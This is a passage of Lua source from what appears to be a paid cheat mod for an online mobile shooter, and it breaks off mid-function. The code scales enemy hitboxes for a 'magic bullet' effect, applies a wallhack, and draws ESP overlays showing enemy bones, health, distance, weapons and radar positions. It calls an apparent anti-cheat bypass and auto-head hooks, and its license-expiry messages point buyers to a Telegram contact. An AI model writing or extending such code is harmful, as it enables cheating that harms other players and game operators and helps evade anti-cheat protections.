    -- MAGIC BULLET SETUP
    local mHead_Global, mBody_Global, mLegs_Global = 1.0, 1.0, 1.0
    local runInject_Global = false
    
    pcall(function()
        if _G.LexusConfig.CustomMagicBullet then
            runInject_Global = true
            mHead_Global = 0; mBody_Global = 0.5; mLegs_Global = 0
            if _G.LexusState.CustomTextData then
                local cData = _G.LexusState.CustomTextData
                if cData.MagicBody ~= nil then mBody_Global = tonumber(cData.MagicBody) or mBody_Global end
            end
        end

        if runInject_Global then
            local currentMagicHash = "M_"..tostring(mHead_Global).."_"..tostring(mBody_Global).."_"..tostring(mLegs_Global)
            if _G.LexusState.LastMagicConfigHash ~= currentMagicHash then
                _G.LexusState.MagicUpdateVersion = (_G.LexusState.MagicUpdateVersion or 0) + 1
                _G.LexusState.LastMagicConfigHash = currentMagicHash
            end
        else
            if _G.LexusState.LastMagicConfigHash ~= "OFF" then
                _G.LexusState.MagicUpdateVersion = (_G.LexusState.MagicUpdateVersion or 0) + 1
                _G.LexusState.LastMagicConfigHash = "OFF"
            end
        end
    end)

    -- ENEMY LOOP
    pcall(function()
        local allCharacters = {}
        if GameplayData.GetAllPlayerCharacters then allCharacters = GameplayData.GetAllPlayerCharacters()
        elseif GameplayData.GameCharacters then for _, char in pairs(GameplayData.GameCharacters) do table.insert(allCharacters, char) end end
        
        local currentValidKeys = {}
        for _, enemy in pairs(allCharacters) do
            if Valid(enemy) and enemy ~= localPlayer then
                currentValidKeys[GetSafeEnemyKey(enemy)] = true
            end
        end
        
        for key, data in pairs(_G.LexusState.EnemyMarks) do
            if not currentValidKeys[key] then
                SafeRemoveMark(data.radarMark)
                SafeRemoveMark(data.hpMark)
                SafeRemoveMark(data.distMark)
                
                if data.MIDs then
                    for meshStr, midTable in pairs(data.MIDs) do
                        for k, _ in pairs(midTable) do
                            midTable[k] = nil
                        end
                    end
                    data.MIDs = nil
                end
                
                data.enemy = nil
                data.CachedMeshes = nil
                _G.LexusState.EnemyMarks[key] = nil
            end
        end

        local realCount = 0
        local aiCount = 0
        _G.__PUT_SNAP_QUEUE = {}

        local function GetFirstElemSafe(elemArray)
            if elemArray and type(elemArray.Num) == "function" and elemArray:Num() > 0 then
                if type(elemArray.Get) == "function" then return elemArray:Get(0) end
            elseif elemArray and type(elemArray) == "table" and #elemArray > 0 then
                return elemArray[1]
            end
            return nil
        end

        local BoneScaleMap = {
            ["head"] = mHead_Global, ["neck_01"] = mHead_Global,
            ["pelvis"] = mBody_Global, ["spine_01"] = mBody_Global, ["spine_02"] = mBody_Global, ["spine_03"] = mBody_Global,
            ["thigh_l"] = mLegs_Global, ["thigh_r"] = mLegs_Global, 
            ["calf_l"] = mLegs_Global, ["calf_r"] = mLegs_Global,   
            ["foot_l"] = mLegs_Global, ["foot_r"] = mLegs_Global    
        }
        
        local mLoc = nil
        pcall(function() if type(localPlayer.K2_GetActorLocation) == "function" then mLoc = localPlayer:K2_GetActorLocation() end end)

        for _, enemy in pairs(allCharacters) do
            if Valid(enemy) and enemy ~= localPlayer and enemy.TeamID ~= localPlayer.TeamID then
                local bIsReallyDead = false
                pcall(function()
                    if type(enemy.IsDead) == "function" then bIsReallyDead = enemy:IsDead()
                    elseif enemy.bIsDead ~= nil then bIsReallyDead = enemy.bIsDead
                    elseif enemy.bIsDeadFlag ~= nil then bIsReallyDead = enemy.bIsDeadFlag end
                    if enemy.HealthStatus ~= nil and enemy.HealthStatus == 2 then bIsReallyDead = true end
                end)

                local eKey = GetSafeEnemyKey(enemy)
                _G.LexusState.EnemyMarks[eKey] = _G.LexusState.EnemyMarks[eKey] or { enemy = enemy }
                local markData = _G.LexusState.EnemyMarks[eKey]
                markData.enemy = enemy 

                if not bIsReallyDead then
                    
                    local eMesh = nil
                    pcall(function() eMesh = enemy.Mesh or (type(enemy.getAvatarComponent2) == "function" and enemy:getAvatarComponent2() or nil) end)
                    local aLoc = nil
                    pcall(function() if type(enemy.K2_GetActorLocation) == "function" then aLoc = enemy:K2_GetActorLocation() end end)
                    
                    local isBotResult, isStateLoaded = CheckIsAI(enemy, markData)
                    local isBot = markData.AK_IS_BOT or false

                    local currentMeshCount = 0
                    if Valid(eMesh) then
                        local tempMeshes = GetAllSkeletalMeshes(enemy, markData)
                        currentMeshCount = #tempMeshes
                    end
                    local isMeshChanged = (markData.LastMeshCountWall ~= currentMeshCount)

                    if _G.LexusConfig.WallXuyenTuong then
                        if isMeshChanged or not markData.WallhackApplied then
                            ApplyWallXuyenTuong(enemy, markData)
                            markData.WallhackApplied = true
                            markData.LastMeshCountWall = currentMeshCount
                        end
                    else
                        UndoWallXuyenTuong(enemy, markData)
                    end

                    if _G.LexusConfig.ColorBodyV2 then 
                        ApplyColorBodyV2(enemy, pc, markData) 
                    else
                        UndoColorBodyV2(enemy, markData)
                    end

                    -- MAGIC BULLET
                    pcall(function()
                        local EnemyMesh = eMesh
                        if slua.isValid(EnemyMesh) then
                            local meshStr = tostring(EnemyMesh)
                            
                            if markData.MagicBulletHash == _G.LexusState.LastMagicConfigHash and markData.LastMeshStr == meshStr then
                                return 
                            end

                            local PhysicsAsset = EnemyMesh.PhysicsAssetOverride
                            if not slua.isValid(PhysicsAsset) and EnemyMesh.SkeletalMesh then PhysicsAsset = EnemyMesh.SkeletalMesh.PhysicsAsset end

                            if slua.isValid(PhysicsAsset) and PhysicsAsset.SkeletalBodySetups then
                                if not _G.AK_ModdedPhysAssets then _G.AK_ModdedPhysAssets = {} end
                                local PhysAssetName = "DefaultPhys"
                                pcall(function() PhysAssetName = PhysicsAsset:GetName() end)
                                
                                if _G.AK_ModdedPhysAssets[PhysAssetName] ~= _G.LexusState.LastMagicConfigHash then
                                    
                                    if not _G.AK_OrigHitboxes then _G.AK_OrigHitboxes = {} end
                                    if not _G.AK_OrigHitboxes[PhysAssetName] then _G.AK_OrigHitboxes[PhysAssetName] = {} end
                                    local OrigHitboxData = _G.AK_OrigHitboxes[PhysAssetName]

                                    local SkeletalBodySetups = PhysicsAsset.SkeletalBodySetups
                                    local numSetups = type(SkeletalBodySetups.Num) == "function" and SkeletalBodySetups:Num() or #SkeletalBodySetups
                                    local limit = numSetups > 50 and 50 or numSetups

                                    for i = 1, limit do 
                                        local BodySetup = type(SkeletalBodySetups.Get) == "function" and SkeletalBodySetups:Get(i-1) or SkeletalBodySetups[i]
                                        if slua.isValid(BodySetup) then
                                            local LowerBoneName = string.lower(tostring(BodySetup.BoneName))
                                            local MatchedBoneKey = nil
                                            for k, _ in pairs(BoneScaleMap) do
                                                if string.find(LowerBoneName, k, 1, true) then MatchedBoneKey = k break end
                                            end

                                            if MatchedBoneKey then
                                                local TargetScale = 1.0
                                                if runInject_Global then TargetScale = BoneScaleMap[MatchedBoneKey] end
                                                
                                                local AggGeom = BodySetup.AggGeom
                                                
                                                local BoxElems = AggGeom and AggGeom.BoxElems or BodySetup.BoxElems
                                                local SphereElems = AggGeom and AggGeom.SphereElems or BodySetup.SphereElems
                                                local SphylElems = AggGeom and AggGeom.SphylElems or BodySetup.SphylElems

                                                local BoxElem = GetFirstElemSafe(BoxElems)
                                                local SphereElem = GetFirstElemSafe(SphereElems)
                                                local SphylElem = GetFirstElemSafe(SphylElems)

                                                if not OrigHitboxData[MatchedBoneKey] then
                                                    OrigHitboxData[MatchedBoneKey] = { Box = nil, Sphere = nil, Sphyl = nil }
                                                    if BoxElem then OrigHitboxData[MatchedBoneKey].Box = { X = BoxElem.X, Y = BoxElem.Y, Z = BoxElem.Z } end
                                                    if SphereElem then OrigHitboxData[MatchedBoneKey].Sphere = { Radius = SphereElem.Radius } end
                                                    if SphylElem then OrigHitboxData[MatchedBoneKey].Sphyl = { Radius = SphylElem.Radius, Length = SphylElem.Length } end
                                                end

                                                local OrigElemData = OrigHitboxData[MatchedBoneKey]

                                                if OrigElemData.Box and BoxElem then
                                                    BoxElem.X = OrigElemData.Box.X * TargetScale
                                                    BoxElem.Y = OrigElemData.Box.Y * TargetScale
                                                    BoxElem.Z = OrigElemData.Box.Z * TargetScale
                                                    if type(BoxElems.Set) == "function" then BoxElems:Set(0, BoxElem) else BoxElems[1] = BoxElem end
                                                    if AggGeom then AggGeom.BoxElems = BoxElems; BodySetup.AggGeom = AggGeom else BodySetup.BoxElems = BoxElems end
                                                end

                                                if OrigElemData.Sphere and SphereElem then
                                                    SphereElem.Radius = OrigElemData.Sphere.Radius * TargetScale
                                                    if type(SphereElems.Set) == "function" then SphereElems:Set(0, SphereElem) else SphereElems[1] = SphereElem end
                                                    if AggGeom then AggGeom.SphereElems = SphereElems; BodySetup.AggGeom = AggGeom else BodySetup.SphereElems = SphereElems end
                                                end

                                                if OrigElemData.Sphyl and SphylElem then
                                                    SphylElem.Radius = OrigElemData.Sphyl.Radius * TargetScale
                                                    SphylElem.Length = OrigElemData.Sphyl.Length * TargetScale
                                                    if type(SphylElems.Set) == "function" then SphylElems:Set(0, SphylElem) else SphylElems[1] = SphylElem end
                                                    if AggGeom then AggGeom.SphylElems = SphylElems; BodySetup.AggGeom = AggGeom else BodySetup.SphylElems = SphylElems end
                                                end
                                            end
                                        end
                                    end
                                    _G.AK_ModdedPhysAssets[PhysAssetName] = _G.LexusState.LastMagicConfigHash
                                end
                                
                                if EnemyMesh.SetPhysicsAsset then EnemyMesh:SetPhysicsAsset(PhysicsAsset) end
                                EnemyMesh.PhysicsAssetOverride = PhysicsAsset
                                
                                markData.MagicBulletHash = _G.LexusState.LastMagicConfigHash
                                markData.LastMeshStr = meshStr
                            end
                        end
                    end)

                    local distM = 0
                    pcall(function() distM = localPlayer:GetDistanceTo(enemy) / 100 end)

                    local currentHp, maxHp = 100, 100
                    local showFrameUI = _G.LexusConfig.EspLoai5 or _G.LexusConfig.EspVipPro or _G.LexusConfig.EspVip
                    
                    if showFrameUI then
                        pcall(function()
                            if enemy.Health then currentHp = enemy.Health elseif type(enemy.GetHealth) == "function" then currentHp = enemy:GetHealth() end
                            if enemy.HealthMax then maxHp = enemy.HealthMax elseif type(enemy.GetHealthMax) == "function" then maxHp = enemy:GetHealthMax() end
                        end)
                        if maxHp <= 0 then maxHp = 100 end
                    end
                    local hpRatio = currentHp / maxHp

                    -- count untuk enemy counter (Antenna / Esp7)
                    if (_G.LexusConfig.EspAntenna or _G.LexusConfig.EspLoai7) and distM <= 600 then
                        if isBot then aiCount = aiCount + 1 else realCount = realCount + 1 end
                    end

                    if _G.LexusConfig.EspAntenna then
                        pcall(function()
                            if distM > 500 then return end

                            local actorLoc = aLoc
                            if not actorLoc then
                                pcall(function() actorLoc = enemy:K2_GetActorLocation() end)
                            end
                            if not actorLoc then return end

                            -- Head world
                            local headPos = nil
                            pcall(function()
                                if Valid(eMesh) and type(eMesh.GetSocketLocation) == "function" then
                                    headPos = eMesh:GetSocketLocation("head")
                                end
                            end)
                            if not headPos then
                                pcall(function()
                                    if type(enemy.GetBonePos) == "function" then
                                        headPos = enemy:GetBonePos("head", {X=0,Y=0,Z=0})
                                    end
                                end)
                            end
                            if not headPos then
                                headPos = { X = actorLoc.X, Y = actorLoc.Y, Z = actorLoc.Z + 90 }
                            end

                            -- Camera
                            local camLoc = nil
                            local pc = nil
                            pcall(function()
                                pc = localPlayer and localPlayer.GetPlayerControllerSafety and localPlayer:GetPlayerControllerSafety()
                                if not pc then
                                    local p = GameplayData and GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
                                    if p and p.GetPlayerControllerSafety then pc = p:GetPlayerControllerSafety() end
                                end
                                if pc then
                                    local GS = import("GameplayStatics")
                                    if GS and GS.GetPlayerCameraManager then
                                        local cm = GS.GetPlayerCameraManager(pc, 0)
                                        if cm and cm.GetCameraLocation then
                                            camLoc = cm:GetCameraLocation()
                                        end
                                    end
                                end
                            end)

                            -- Titik ujung: deproject tengah-atas layar, fallback cam+up
                            local endPos = nil
                            pcall(function()
                                if pc and pc.DeprojectScreenPositionToWorld then
                                    local ui_util = require("client.common.ui_util")
                                    local vp = ui_util and ui_util.GetViewportSize and ui_util.GetViewportSize()
                                    local cx = (vp and vp.X or 1080) * 0.5
                                    local cy = 20
                                    local wLoc, wDir = FVector(0,0,0), FVector(0,0,0)
                                    local ok = pc:DeprojectScreenPositionToWorld(cx, cy, wLoc, wDir)
                                    if ok and wLoc and wDir then
                                        -- potong ray di jarak ~ ke enemy (atau fixed)
                                        local dist = distM * 100
                                        if dist < 200 then dist = 200 end
                                        if dist > 3000 then dist = 3000 end
                                        endPos = {
                                            X = wLoc.X + wDir.X * dist,
                                            Y = wLoc.Y + wDir.Y * dist,
                                            Z = wLoc.Z + wDir.Z * dist,
                                        }
                                    end
                                end
                            end)
                            if not endPos and camLoc then
                                endPos = { X = camLoc.X, Y = camLoc.Y, Z = camLoc.Z + 80 }
                            end
                            if not endPos then
                                endPos = { X = headPos.X, Y = headPos.Y, Z = headPos.Z + 1200 }
                            end

                            -- [1] DrawDebugLine (engine C++ debug draw) — garis solid putih
                            pcall(function()
                                local K = import("KismetSystemLibrary")
                                if not K or not K.DrawDebugLine then return end
                                local ctx = localPlayer or enemy
                                local thickness = 2.8
                                local dur = 0.06
                                -- coba FLinearColor
                                local col = nil
                                pcall(function()
                                    col = FLinearColor(1, 1, 1, 1)
                                end)
                                if not col then col = { R = 1, G = 1, B = 1, A = 1 } end
                                K.DrawDebugLine(ctx, headPos, endPos, col, dur, thickness)
                            end)

                            -- [2] Antrikan untuk garis UMG screen-space (lebih stabil di shipping)
                            _G.__PUT_SNAP_QUEUE = _G.__PUT_SNAP_QUEUE or {}
                            local sx, sy = nil, nil
                            pcall(function()
                                if pc and pc.ProjectWorldLocationToScreen then
                                    local s = import("Vector2D")()
                                    if pc:ProjectWorldLocationToScreen(headPos, s, false) then
                                        sx, sy = s.X, s.Y
                                    end
                                end
                            end)
                            if sx and sy then
                                local q = _G.__PUT_SNAP_QUEUE
                                q[#q + 1] = { x = sx, y = sy }
                            end
                        end)
                    end

                    if _G.LexusConfig.EspLoai6 then
                        pcall(function()
                            local MyHUD = Cached_MyHUD
                            if Valid(MyHUD) then
                                if Valid(eMesh) and type(eMesh.GetSocketLocation) == "function" then
                                    if distM <= 400 then
                                        if aLoc then
                                            local boneLocs = {}
                                            
                                            for _, bName in ipairs(GLOBAL_BONE_LIST) do
                                                local shouldDraw = true
                                                if distM > 150 and (bName ~= "head" and bName ~= "pelvis" and bName ~= "neck_01") then
                                                    shouldDraw = false
                                                end

                                                if shouldDraw then
                                                    local wLoc = nil
                                                    if type(eMesh.GetSocketLocation) == "function" then wLoc = eMesh:GetSocketLocation(bName) end
                                                    
                                                    if wLoc then                                                        local ox = wLoc.X - aLoc.X
                                                        local oy = wLoc.Y - aLoc.Y
                                                        local oz = wLoc.Z - aLoc.Z
                                                        boneLocs[bName] = {X=ox, Y=oy, Z=oz}
                                                        
                                                        local mark = "▪"
                                                        local fixedSize = 0.25 
                                                        local color = C_CYAN
                                                        if bName == "head" then mark = "●"; fixedSize = 0.45; color = C_RED
                                                        elseif bName == "pelvis" or bName == "neck_01" then mark = "▪"; fixedSize = 0.35; color = C_YELLOW end
                                                        
                                                        MyHUD:AddDebugText(mark, enemy, 0.06, boneLocs[bName], boneLocs[bName], color, true, false, true, nil, fixedSize, true)
                                                    end
                                                end
                                            end

                                            if distM <= 100 then
                                                for _, pair in ipairs(GLOBAL_CONNECTIONS) do
                                                    local p1 = boneLocs[pair[1]]
                                                    local p2 = boneLocs[pair[2]]
                                                    if p1 and p2 then
                                                        local col = pair[3]
                                                        local dx = p2.X - p1.X; local dy = p2.Y - p1.Y; local dz = p2.Z - p1.Z
                                                        local length = math.sqrt(dx*dx + dy*dy + dz*dz)
                                                        local segments = math.floor(length / 12)
                                                        if segments > 5 then segments = 5 end
                                                        if segments < 2 then segments = 2 end
                                                        
                                                        for i = 1, segments do
                                                            local fraction = i / (segments + 1)
                                                            local mid = { X = p1.X + dx * fraction, Y = p1.Y + dy * fraction, Z = p1.Z + dz * fraction }
                                                            MyHUD:AddDebugText("•", enemy, 0.06, mid, mid, col, true, false, true, nil, 0.35, true)
                                                        end
                                                    end
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end)
                    end

                    if (_G.LexusConfig.EspVip or _G.LexusConfig.EspLoai7 or _G.LexusConfig.EspAntenna) and distM <= 600 then
                        if isBot then aiCount = aiCount + 1 else realCount = realCount + 1 end
                    end

                    if _G.LexusConfig.EspLoai7 then
                        pcall(function()
                            local MyHUD = Cached_MyHUD
                            if Valid(MyHUD) then
                                
                                
                                if distM <= 400 then
                                    local stateText = ""
                                    local pose = nil
                                    if enemy.PoseState then pose = enemy.PoseState
                                    elseif type(enemy.GetPoseState) == "function" then pose = enemy:GetPoseState() end
                                    
                                    if pose == 0 or pose == "Stand" then stateText = "Standing"
                                    elseif pose == 1 or pose == "Crouch" then stateText = "Crouching"
                                    elseif pose == 2 or pose == "Prone" then stateText = "Prone"
                                    else stateText = "Standing" end
                                    
                                    local curTime = os.clock()
                                    if markData.AK_LAST_WEP_TIME == nil or curTime > markData.AK_LAST_WEP_TIME + 1.5 then
                                        local eWeapon = nil
                                        if enemy.CurrentWeapon then eWeapon = enemy.CurrentWeapon
                                        elseif type(enemy.GetCurrentWeapon) == "function" then eWeapon = enemy:GetCurrentWeapon()
                                        elseif enemy.WeaponManagerComponent then eWeapon = enemy.WeaponManagerComponent.CurrentWeaponReplicated end
                                        
                                        local weaponName = "No Weapon"
                                        if Valid(eWeapon) then if type(eWeapon.GetWeaponName) == "function" then weaponName = eWeapon:GetWeaponName() end
                                        else weaponName = "Unarmed" end
                                        markData.AK_CACHED_WEP_NAME = tostring(weaponName)
                                        markData.AK_LAST_WEP_TIME = curTime
                                    end

                                    stateText = stateText .. " - " .. (markData.AK_CACHED_WEP_NAME or "Unarmed")
                                    local textColor = isBot and C_CYAN or C_YELLOW
                                    local dynamicScale = math.max(0.5, 0.8 - (distM / 400))
                                    
                                    MyHUD:AddDebugText(stateText, enemy, 0.06, {X=0, Y=0, Z=100}, {X=0, Y=0, Z=100}, textColor, true, false, true, nil, dynamicScale, true)
                                end
                            end
                        end)
                    end

                    if showFrameUI then
                        pcall(function()
                            local SecurityCommonUtils = Cached_SecurityCommonUtils
                            local show = true
                            if enemy.HealthStatus and SecurityCommonUtils and SecurityCommonUtils.IsHealthStatusAlive then 
                                if not SecurityCommonUtils.IsHealthStatusAlive(enemy.HealthStatus) then show = false end
                            end
                            if show and mLoc then
                                if aLoc and SecurityCommonUtils and SecurityCommonUtils.IsVector then
                                    if SecurityCommonUtils.IsVector(aLoc) and SecurityCommonUtils.IsVector(mLoc) then
                                        if aLoc.Z >= 150000 or FVector.Dist2D(mLoc, aLoc) > 50000 then show = false end
                                    end
                                end
                            end
                            if show then
                                if enemy.Replay_IsEnemyFrameUIExisted and not enemy:Replay_IsEnemyFrameUIExisted() then enemy:Replay_CreateEnemyFrameUI(true, true) end
                                if enemy.Replay_SetVisiableOfFrameUI then enemy:Replay_SetVisiableOfFrameUI(true) end
                                if enemy.Replay_UpdateEnemyFrameUI then enemy:Replay_UpdateEnemyFrameUI(hpRatio) end
                                
                                local uiComp = enemy.EnemyFrameUI or (type(enemy.GetEnemyFrameUI) == "function" and enemy:GetEnemyFrameUI())
                                if Valid(uiComp) then
                                    if markData.LastFrameUIState ~= "VISIBLE" then
                                        if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(0) end
                                        if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(false) end
                                        markData.LastFrameUIState = "VISIBLE"
                                    end
                                end
                            end
                        end)
                    else
                        pcall(function()
                            if enemy.Replay_SetVisiableOfFrameUI then enemy:Replay_SetVisiableOfFrameUI(false) end
                            local uiComp = enemy.EnemyFrameUI or (type(enemy.GetEnemyFrameUI) == "function" and enemy:GetEnemyFrameUI())
                            if Valid(uiComp) then
                                if markData.LastFrameUIState ~= "HIDDEN" then
                                    if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(2) end
                                    if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(true) end
                                    markData.LastFrameUIState = "HIDDEN"
                                end
                            end
                        end)
                    end

                    if _G.LexusConfig.EspVipPro then
                        pcall(function()
                            local hud = Cached_MyHUD
                            if Valid(hud) and hud.AddDebugText then
                                if distM <= 400 then
                                    local dynamicScale = math.max(0.55, 0.95 - (distM / 400))
                                    local hpPercent = hpRatio
                                    local isKnock = (currentHp <= 0 and enemy.HealthStatus == 1)
                                    local enemyName = "Enemy"
                                    pcall(function() if enemy.PlayerName then enemyName = enemy.PlayerName elseif type(enemy.GetPlayerName) == "function" then enemyName = enemy:GetPlayerName() end end)
                                    if enemyName == "" then enemyName = "Enemy" end
                                    if isKnock then enemyName = "KNOCK: " .. enemyName end
                                    
                                    local hpColor = C_GREEN
                                    if hpPercent < 0.3 then hpColor = C_RED
                                    elseif hpPercent < 0.7 then hpColor = C_YELLOW end
                                    if isKnock then hpColor = C_RED end
                                    
                                    hud:AddDebugText(enemyName, enemy, 0.06, {X=0, Y=0, Z=-370}, {X=0, Y=0, Z=-370}, C_WHITE, true, false, true, nil, dynamicScale * 1.1, true)
                                    if not isKnock then
                                        local segments = 6
                                        local filled = math.floor(hpPercent * segments)
                                        local startZ = 20
                                        local spacing = 10.0 * dynamicScale 
                                        for j = 1, segments do
                                            local color = (j <= filled) and hpColor or {R=30,G=30,B=30,A=180}
                                            hud:AddDebugText("█", enemy, 0.06, {X=0, Y=-115, Z=startZ + (j * spacing)}, {X=0, Y=-115, Z=startZ + (j * spacing)}, color, true, false, true, nil, dynamicScale * 1.2, true)
                                        end
                                        hud:AddDebugText(string.format("%d%%", math.floor(hpPercent * 100)), enemy, 0.06, {X=0, Y=-60, Z=startZ - 12}, {X=0, Y=-60, Z=startZ - 12}, hpColor, true, false, true, nil, dynamicScale * 0.8, true)
                                    else
                                        hud:AddDebugText("DOWN", enemy, 0.06, {X=0, Y=-115, Z=50}, {X=0, Y=-115, Z=50}, C_RED, true, false, true, nil, dynamicScale * 1.0, true)
                                    end
                                end
                            end
                        end)
                    end

                    if _G.LexusConfig.EspDistance then
                        pcall(function()
                            local hud = Cached_MyHUD
                            if Valid(hud) and hud.AddDebugText then
                                if distM <= 400 then
                                    local dynamicScale = math.max(0.55, 0.95 - (distM / 400))
                                    hud:AddDebugText(string.format("[%dm]", math.floor(distM)), enemy, 0.06, {X=0, Y=115, Z=20}, {X=0, Y=115, Z=20}, C_BLUE_TEXT, true, false, true, nil, dynamicScale * 1.5, true)
                                end
                            end
                        end)
                    end

                    if _G.LexusConfig.EspVip then
                        if markData.hpMark == nil then markData.hpMark = SafeAddMark(1006, FVector(0,0,0), 110, "", 4, enemy) end
                        if markData.distMark == nil then markData.distMark = SafeAddMark(9999, FVector(0,0,0), 85, "", 4, enemy) end
                    else
                        if markData.hpMark then SafeRemoveMark(markData.hpMark); markData.hpMark = nil end
                        if markData.distMark then SafeRemoveMark(markData.distMark); markData.distMark = nil end
                    end
                    
                    if _G.LexusConfig.EspRadar then
                        pcall(function()
                            local UGameplayStatics = import("GameplayStatics")
                            local CGameWorld = slua_GameFrontendHUD and slua_GameFrontendHUD:GetWorld()
                            local curTime = (UGameplayStatics and CGameWorld) and UGameplayStatics.GetTimeSeconds(CGameWorld) or os.clock()
                            
                            markData.LastRadarUpdate = markData.LastRadarUpdate or 0
                            if curTime > markData.LastRadarUpdate + 0.5 then
                                local headLoc = nil
                                if type(enemy.GetHeadLocation) == "function" then headLoc = enemy:GetHeadLocation(false) end
                                if headLoc then
                                    local InGameMarkTools = require("GameLua.Mod.BaseMod.Common.InGameMarkTools")
                                    if markData.radarMark and InGameMarkTools and InGameMarkTools.HideMapMark then 
                                        InGameMarkTools.HideMapMark(markData.radarMark) 
                                    end
                                    if InGameMarkTools and InGameMarkTools.ClientAddMapMark then
                                        markData.radarMark = InGameMarkTools.ClientAddMapMark(1003, headLoc, 0, "", 4, nil)
                                    end
                                    markData.LastRadarUpdate = curTime
                                end
                            end
                        end)
                    else
                        if markData.radarMark then
                            SafeRemoveMark(markData.radarMark)
                            markData.radarMark = nil
                        end
                    end
                    
                    if _G.LexusConfig.EspOutline then
                        pcall(function()
                            local PPM = Cached_PPM
                            local avatarComp = (type(enemy.getAvatarComponent2) == "function") and enemy:getAvatarComponent2() or nil
                            if Valid(avatarComp) and Valid(PPM) then
                                PPM.OutlineThickness = _G.LexusConfig.OutlineThickness
                                if PPM.OutlineColor then PPM.OutlineColor = {r = 1, g = 0, b = 0, a = 1} end
                                PPM:EnableAvatarOutline(avatarComp, true)
                            end
                        end)
                    else
                        pcall(function()
                            local PPM = Cached_PPM
                            local avatarComp = (type(enemy.getAvatarComponent2) == "function") and enemy:getAvatarComponent2() or nil
                            if Valid(avatarComp) and Valid(PPM) then PPM:EnableAvatarOutline(avatarComp, false) end
                        end)
                    end

                else
                    if not markData.IsCleanedUp then
                        SafeRemoveMark(markData.radarMark)
                        markData.radarMark = nil
                        SafeRemoveMark(markData.hpMark)
                        markData.hpMark = nil
                        SafeRemoveMark(markData.distMark)
                        markData.distMark = nil
                        
                        if markData.MIDs then
                            for meshStr, midTable in pairs(markData.MIDs) do
                                for k, _ in pairs(midTable) do midTable[k] = nil end
                            end
                            markData.MIDs = nil
                        end
                        
                        pcall(function()
                            local eObj = markData.enemy
                            if Valid(eObj) then 
                                if eObj.Replay_SetVisiableOfFrameUI then eObj:Replay_SetVisiableOfFrameUI(false) end
                                local uiComp = eObj.EnemyFrameUI or (type(eObj.GetEnemyFrameUI) == "function" and eObj:GetEnemyFrameUI())
                                if Valid(uiComp) then
                                    if type(uiComp.SetVisibility) == "function" then uiComp:SetVisibility(2) end 
                                    if type(uiComp.SetHiddenInGame) == "function" then uiComp:SetHiddenInGame(true) end
                                end
                            end
                            
                            local PPM = Cached_PPM
                            local avatarComp = Valid(eObj) and (type(eObj.getAvatarComponent2) == "function") and eObj:getAvatarComponent2() or nil
                            if Valid(avatarComp) and Valid(PPM) then PPM:EnableAvatarOutline(avatarComp, false) end
                        end)

                        markData.IsCleanedUp = true
                    end
                end
            end
        end

        -- Enemy counter + flush snapline UMG
        if _G.DrawEnemyCounter then
            pcall(_G.DrawEnemyCounter)
        end
        if _G.PUT_FlushSnapLines then
            pcall(_G.PUT_FlushSnapLines)
        end
    end)
    
    -- Lost Tomb Features Loop
    LostTombFeaturesLoop()
end

_G.LexusState.LoopToken = (_G.LexusState.LoopToken or 0) + 1 
local myToken = _G.LexusState.LoopToken

local function ExpiredTick()
    if not _G.LexusNotifiedPopup then
        pcall(function()
            local Msg = require("client.slua.logic.common.logic_common_msg_box")
            if Msg and Msg.Show then
                Msg.Show(1, "MOD MUDDATI TUGADI", "MOD VERSIYANGIZNING MUDDATI MUDDATI!\nYANGILASH UCHUN ILTIMOS, EGASI BILAN BOG'LANING\nTelegram @SHAYAN_TOOL1", 
                function() 
                    local Web = require("client.slua.logic.url.logic_webview_sdk")
                    if Web and Web.OpenURL then Web:OpenURL("https://Wa.me/+923319741588") end 
                end, 
                function() end, "SOTIB OLISH", "KERAK EMAS")
                _G.LexusNotifiedPopup = true 
            end
        end)
        
        if not _G.LexusNotifiedPopup then
            local okTicker, ticker = pcall(require, "common.time_ticker") 
            if okTicker and ticker and ticker.AddTimerOnce then 
                ticker.AddTimerOnce(2.0, ExpiredTick) 
            end
        end
    end
end

local function FastTick()
    if isExpired then
        if not _G.LexusNotifiedExpire then
            Notify("MOD MUDDATI TUGADI! SOTIB OLISH YOKI YANGILASH UCHUN EGASI BILAN BOG'LANING!\nTelegram @SHAYAN_TOOL1")
            _G.LexusNotifiedExpire = true
            ExpiredTick() 
        end
        return 
    end

    if myToken ~= _G.LexusState.LoopToken then return end
    if not (_G.IsLicenseOK and _G.IsLicenseOK()) then
        local okTicker, ticker = pcall(require, "common.time_ticker")
        if okTicker and ticker and ticker.AddTimerOnce then
            ticker.AddTimerOnce(0.25, FastTick)
        end
        return
    end
    pcall(MainLoop)
    local okTicker, ticker = pcall(require, "common.time_ticker") 
    if okTicker and ticker and ticker.AddTimerOnce then 
        ticker.AddTimerOnce(0.03, FastTick) 
    end 
end

if not isExpired then
    FastTick()
    Notify("SHAYAN VIP SERIES MOD LOADED SUCCESSFULLY!\nPUT | Contact SHAYAN_TOOL1")
else
    _G.DisableModAccess("MOD EXPIRED", true)
    pcall(function() _G.RemoveRegisteredModMenu() end)
    FastTick()
end

local function InitAllModSystems()
    if isExpired then return end
    if not (_G.IsLicenseOK and _G.IsLicenseOK()) then return end

    pcall(function()
        if _G.PUT_LoadConfig then _G.PUT_LoadConfig() end
        if _G.StartBypass_VIP_v3 then _G.StartBypass_VIP_v3() end
        if _G.InitializeAutoHeadHooks then _G.InitializeAutoHeadHooks() end
        -- Skin inventory lobby + match
        pcall(function()
            if _G.AddOutfit then
                if _G.AddOutfit.injectAll then _G.AddOutfit.injectAll() end
                if _G.AddOutfit.persistLoadFromDisk then _G.AddOutfit.persistLoadFromDisk() end
                if _G.AddOutfit.persistApplyLoaded then _G.AddOutfit.persistApplyLoaded() end
            end
        end)
        if _G.LexusConfig and _G.LexusConfig.UnlockFPS then
            pcall(function()
                if InitializeGraphicsUnlock then InitializeGraphicsUnlock() end
                if _G.ForceApply165FPS then _G.ForceApply165FPS() end
            end)
        end
    end)

    local GameplayData = package.loaded["GameLua.GameCore.Data.GameplayData"] or require("GameLua.GameCore.Data.GameplayData")
    if not GameplayData then return end

    pcall(function()
        local LocalPlayer = GameplayData.GetPlayerCharacter and GameplayData.GetPlayerCharacter()
        if slua.isValid(LocalPlayer) then
            if LocalPlayer.bHasShownDevNotice == nil then
                LocalPlayer.bHasShownDevNotice = false 
                LocalPlayer.bHasShownExpiredNotice = false 
